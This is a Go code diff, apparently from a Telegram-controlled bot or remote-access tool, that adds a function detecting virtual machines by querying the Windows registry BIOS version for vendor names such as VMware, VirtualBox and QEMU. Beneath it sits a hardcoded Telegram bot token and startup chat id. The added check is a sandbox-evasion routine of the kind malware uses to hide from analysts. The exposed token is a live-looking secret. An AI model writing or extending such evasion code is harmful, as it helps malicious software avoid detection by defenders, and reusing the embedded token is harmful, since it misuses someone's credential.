@@ -22,6 +22,55 @@ import (
 	"github.com/shirou/gopsutil/process"
 )
 
+// ///////////////////////////////////////////////////////////////////////////
+// #emulator check
+func isEmulatedEnvironment() bool {
+	// Common VM vendors
+	suspectVendors := []string{
+		"Microsoft Corporation", // Hyper-V
+		"VMware",                // VMware
+		"VirtualBox",            // Oracle
+		"Xen",                   // Xen
+		"QEMU",                  // QEMU
+		"Parallels",             // Parallels
+	}
+
+	// Check BIOS vendor
+	biosVendorPath := "HARDWARE\\DESCRIPTION\\System"
+	biosVendor, err := readRegistryValue("HKLM", biosVendorPath, "SystemBiosVersion")
+	if err == nil {
+		for _, vendor := range suspectVendors {
+			if strings.Contains(strings.ToLower(biosVendor), strings.ToLower(vendor)) {
+				return true
+			}
+		}
+	}
+
+	// Optionally check for MAC addresses or system product names too...
+
+	return false
+}
+
+func readRegistryValue(root, path, name string) (string, error) {
+	cmd := exec.Command("reg", "query", root+"\\"+path, "/v", name)
+	out, err := cmd.Output()
+	if err != nil {
+		return "", err
+	}
+	lines := strings.Split(string(out), "\n")
+	for _, line := range lines {
+		if strings.Contains(line, name) {
+			fields := strings.Fields(line)
+			if len(fields) >= 3 {
+				return strings.Join(fields[2:], " "), nil
+			}
+		}
+	}
+	return "", fmt.Errorf("value not found")
+}
+
+//###################################################################################################333
+
 const (
 	BOT_TOKEN     = "7727386095:AAGVE3OsgVvAEEeZlFe6j5VK9ej4YMd9qm8"
 	STARTUP_CHAT  = 5441972884
